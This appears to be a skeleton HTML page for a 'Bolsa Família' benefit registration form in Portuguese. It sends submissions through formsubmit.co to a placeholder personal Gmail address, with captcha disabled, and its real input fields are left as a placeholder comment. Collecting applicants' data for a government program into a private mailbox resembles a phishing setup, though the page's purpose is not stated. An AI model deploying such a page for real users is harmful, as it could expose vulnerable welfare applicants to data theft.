<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro Bolsa Família</title>
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div class="container">
        <header>
            <h1>Cadastro Bolsa Família</h1>
            <p>Preencha todos os dados abaixo para solicitar o benefício</p>
        </header>

        <!-- Remova a parte PHP das mensagens ou use JavaScript -->
        <div id="message" class="message" style="display: none;"></div>

        <form action="https://formsubmit.co/seu-email@gmail.com" method="POST" class="cadastro-form">
            <input type="hidden" name="_subject" value="Novo Cadastro Bolsa Família">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://seuusuario.github.io/bolsa-familia/obrigado.html">
            
            <!-- TODOS OS SEUS CAMPOS DO FORMULÁRIO AQUI -->
            <!-- (mantenha exatamente como estão no PHP) -->
            
            <button type="submit" class="btn-submit">Enviar Cadastro</button>
        </form>
    </div>

    <script src="js/script.js"></script>
</body>
</html>
